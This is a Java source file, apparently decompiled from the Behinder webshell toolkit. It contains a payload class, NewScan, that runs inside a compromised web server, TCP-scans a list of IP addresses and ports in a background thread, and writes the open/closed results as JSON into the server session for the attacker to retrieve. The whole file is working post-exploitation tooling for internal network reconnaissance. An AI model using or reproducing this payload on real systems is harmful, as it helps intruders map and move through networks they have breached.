package net.rebeyond.behinder.payload.java;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class NewScan implements Runnable {
   public static String ipList;
   public static String portList;
   public static String taskID;
   private Object Session;
   private Object Request;
   private Object response;

   public NewScan() {
   }

   public NewScan(Object session) {
      this.Session = session;
   }

   public void execute(Object request, Object response, Object session) throws Exception {
      (new Thread(new NewScan(session))).start();
   }

   public void run() {
      try {
         String[] ips = ipList.split(",");
         String[] ports = portList.split(",");
         Map sessionObj = new HashMap();
         Map scanResult = new HashMap();
         sessionObj.put("running", "true");
         String[] var5 = ips;
         int var6 = ips.length;

         for(int var7 = 0; var7 < var6; ++var7) {
            String ip = var5[var7];
            String[] var9 = ports;
            int var10 = ports.length;

            for(int var11 = 0; var11 < var10; ++var11) {
               String port = var9[var11];

               try {
                  Socket socket = new Socket();
                  socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                  socket.close();
                  scanResult.put(ip + ":" + port, "open");
               } catch (Exception var14) {
                  scanResult.put(ip + ":" + port, "closed");
               }

               sessionObj.put("result", this.buildJson(scanResult, false));
               this.sessionSetAttribute(this.Session, taskID, sessionObj);
            }
         }

         sessionObj.put("running", "false");
      } catch (Exception var15) {
      }

   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }
}
